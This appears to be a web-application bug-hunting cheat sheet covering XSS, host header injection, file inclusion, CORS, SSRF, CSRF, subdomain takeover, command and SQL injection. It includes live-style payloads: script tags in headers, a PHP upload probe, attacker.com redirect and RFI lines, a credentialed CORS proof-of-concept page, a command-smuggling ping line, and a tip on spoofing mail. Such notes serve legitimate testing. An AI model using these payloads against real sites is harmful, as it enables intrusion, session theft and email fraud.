# 1. XSS

### 3 Types of XSS

1. Reflected XSS – This attack occurs, when a malicious script is not being saved on the web server but reflected in the website’s results.
2. Stored XSS – This attack occurs when a malicious script is being saved on the web server permanently.
3. DOM – This occurs, when the DOM environment is being changed, but the code remains the same.

Note:
* Use Burp Suite Spider to find all parameters on target site.
* Use a XSS Payload list with Burp Suite Intruder to speed up injections.

----------------------------------

# XSS Through Host Header Parameters

Example 1:
Host: victim.com"</b><script>alert('1');</script>

Example 2:
Referer: <script>alert('1');</script>

Note: If only the headers are reflected on the page it might be vulnerable to XSS injections.

----------------------------------

# XSS Through File Upload

Note: 
* When uploading an image use Burp Suite Proxy Intercepter to capture the Post Data Form.
Then use XSS Payload list to check for vulnerabilities. 
* If site is using php you can upload a php3 script with the following code to see if it's 
vulnerable to Unrestricted File Upload.

```
<?php
  echo $_GET["c"];
?>
```
* When code is uploaded go to the file upload path and type in the url bar
the parameter 'c' along with phpinfo() to see if exploit was successful.

----------------------------------

# 2. Host Header Injection

Example 1:
Host: victim.com
to
Host: attacker.com

Example 2:
Host: victim.com
X-Forwarded-Host: attacker.com

Example 3:
Host: attacker.com
X-Forwarded-Host: victim.com

Note:
* Location header should show injected site.
* Some links in the page may direct to injected site so check links in page.

----------------------------------

# 3. URL Redirection Through Path Fragments

Example 1:
Before - https://victim.com
After - https://victim.com//attacker.com/

Note:
* This will redirect users to newly injected site.
* Use Burp Suite Spider to find all parameters on target site.
* Use a XSS Payload list with Burp Suite Intruder to speed up injections.

----------------------------------

# 4. Parameter Tampering

Use Burp Suite Intercepter to modify and send request.

Types of sites that are most vulnerable are ecommerce sites and subscriptions. 

Example 1:
<input type="hidden" id="688" name="cost" value="$100" />

Note:
Attacker can modify value to lower the cost. 

Example 2:
Before: http://www.attackbank.com/default.asp?profile=741&debit=1000
After: http://www.attackbank.com/default.asp?profile=852&debit=2000

Note:
This vulnerability will likely be successful if there are no checks on the server-side.

----------------------------------

# 5. HTML Injection

This is when user input is not correctly sanitized or the output is not encoded 
and the attacker is able to inject valid HTML code into a vulnerable web page.

You can direct users to a malicious page when clicked on the htmli link.
<a href="attacker.com/exploit.php">Info</a>

Note:
Simply put some basic code in the input parameter like `<h1>hello</h1>` 
If it reflects back in HTML then you successfully completed the exploit.

----------------------------------

# 6. File Inclusion

Allows the user to submit input into files or upload files to the server.

Types of Attack:
* DOS (Denial of Service)
* Access to sensitive information 

Types of Inclusion:
1. LFI (Local File Inclusion) 
* LFI allows an attacker to read/execute files on the victim machine.

2. RFI (Remote File Inclusion)
* RFI is able to upload a file, link it and then execute code hosted on a server they own.
Ex: 

### LFI Hunting Through Intruder
1) Pick a target site
2) Crawl site using Burp Suite
3) Search parameters using Burp Suite Search
4) Search for parameters like `file` or `page`
5) Only have the following checked
  ..* In scope only
  ..* Request headers
  ..* Request body
6) Use Burp Suite Intruder and LFI payload list to automatically check for vulnerabilities.

### Remote File Inclusion

Example:

Before: http://victim.com/ajax.php?url=http://victim.com/foo.rss

After: http://victim.com/ajax.php?url=http://attacker.com/alert.js

Note: 
This will run the exploit when user presses return

----------------------------------

# 7. Missing SPF record

When a domain lacks an SPF policy, an attacker is able to send spoofed emails 
that look like they’re originating from the vulnerable domain.

To check if domain has a SPF record you can use Kitterman SPF Query Tool

https://www.kitterman.com/spf/validate.html
or
https://www.mxtoolbox.com/SuperTool.aspx

Example:

When a domain is vulnerable you can use a fake mailer to imitate the real domain.

You can use https://anonymousmail.me

----------------------------------

# 8. Insecure CORS Configuration

Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the resource originated. CORS eliminates some restrictions imposed by the Same-origin policy that would block a AJAX requests from accessing data on a web page unless it is coming from the same origin.

### Domain is Vulnerable if the following are found

1. Check Response Header
2. Look For:
..* Access-Control-Allow-Origin: https://foo.com
..* Access-Control-Allow-Origin: *
..* Access-Control-Allow-Credentials: True

### CORS Hunting Through Burp Suite
1) Pick a target site
2) Crawl site using Burp Suite
3) Search parameters using Burp Suite Search
4) Only have the following checked
  ..* In-scope only
  ..* Response headers
5) Search for query like `Access-Control-Allow-Origin: *`
6) Check for urls with the parameter `?embed` to check for remote file includes.

If no `Access-Control-Allow-Origin` is found you can
add the following to your request header.

Origin: null or foo.com

The response will return with the following:
`Allow-Control-Allow-Origin: foo.com`
`Allow-Control-Allow-Origin: *`

### Confirm if site is Exploitable

1. Have a html file in your computer with the following code 
2. Open it in your browser

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<!--- Change URL to vulnerable site -->
<script>
function cors() {
var xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET","https://foo.com", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

----------------------------------

# 9. SSRF (Server-Side Request Forgery)

The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:

Example 1:
http://foo.com/?requesturl=https://expressvpn.com/what-is-my-ip

You have to find a url with a parameter that will have a external or internal interaction with a remote server.

How do you check if server is making request to 3rd party domain.

Include `http://expressvpn.com/what-is-my-ip` as your payload then check burp response and see if IP address is different from yours.

----------------------------------

# 10. Scan for Critical Files

Set your initial payload to:
http://foo.com/idnf

Go on Burp Suite and set `idnf` as a payload parameter.

Then go on intruder and use the `critical-files-list.txt` to scan for vulnerable files.

----------------------------------

# 11. Source Code Disclosure

Search for files in the url such as `showimage.php`, `login.php` to view their source code with Burp Suite Repeater.

Example:
`https://foo.com/login.php`

----------------------------------

# 12. XML External Entity Injection

Attempt to inject XML or reserved characters into input parameters and observe if
XML parsing errors are generated.

* For web services, check each input parameter specified in the WSDL document for
those of type XML.
* Use Burp Suite Intruder to inject XML payloads to fetch system configuration files 

Find URLs that have the `xml` parameter.

Example:
`https://foo.com/?xml=injecthere`

----------------------------------

# 13. File Upload Injection

Use `https://github.com/almandin/fuxploider` tool to see what files can be uploaded on the upload form.

Then use `https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images`
images to see if exploits work.

----------------------------------

# 14. CSRF

CSRF(Cross-Site Request Forgery) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. A CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

Note: CSRF can be `GET` or `POST` based

### GET Instructions
1. `https://foo.com/?query=You have been hacked`
2. Open it in a new window
3. If the query runs when visited then injection was successful.

### POST Instructions
1. Find a POST data form on the web application. 
2. In Burp Suite capture it then click on `Engagement Tools`
3. Select `Generate CSRF PoC`  and save the code into a html file. 
4. Then open it and click submit button. 
5. Check if requests is made on the web application if so the form is vulnerable to CSRF.

### Login Example

1. Turn proxy on in Burp Suite
2. Login to a site
3. On Burp Suite Select `Generate CSRF PoC` and save the code into a html file. 
4. Then open it in a incognito window and click submit button. 
5. If login is made on the web application then form is vulnerable to CSRF.

----------------------------------

# 15. Hostile Subdomain Takeover

You have a site called (any.com) and you want a support system 

Example:
support.any.com from zendesk.com(support)

You then pointed this subdomain to zendesk support later on you cancel or service expired 
but you forgot to remove the redirection of pointing subdomain to zendesk.com {support}

If an attacker finds out then the attacker will simply go to zendesk.com 

Buy their support service and will add this subdomain (support.any.com) as their own 
and they will claim that this subdomain belongs to them because there is no verification on zendesk
	
### Instructions 

1. You have to find a subdomain pointing to third party {is an alais of x.com}
2. Make sure their service is inactive or cancelled or expired 
3. Go that third party website register as client and point their subdomain as yours 

Use `https://github.com/nahamsec/HostileSubBruteforcer` tool automate your findings.

Example:
ask.foo.com --> 127.0.0.1
Seems like ask.foo.com is an alias for domains.foo2.com

Check if ask.foo.com is active if it isn't then you can takeover!

----------------------------------

# 16. Command Injection

Command injection is the execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. Operating system commands are usually executed with the privileges of the vulnerable application due to insufficient input validation.

It is possible to adding a second system command while getting useful information.
The command could could look like this:
`ping -c 5 127.0.0.1; id`

### Possible Related Parameters

daemon, host
upload, dir, execute, download
log, ip, cli, cmd 

### Use Delimiter List to break or continue the execution of CMD

`;`, `^`, `&`,
`&&`, `|`, `||`,
`%0D`, `%0A`, `\n`,
`<`

Download `https://github.com/commixproject/commix.git` to automate the process.

You can also use Burp Suite Intruder and use Battery Ram attack with two lists. `delimiter.txt` and `cmd_payload.txt`

----------------------------------

# 17. SQL Injection

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. 

### Injection Point for SQL Injection

* SQL Injection can be GET Based
* SQL Injection can be POST Based
* SQL Injection can be Header Based
* SQL Injection can be Cookie Based 

----------------------------------
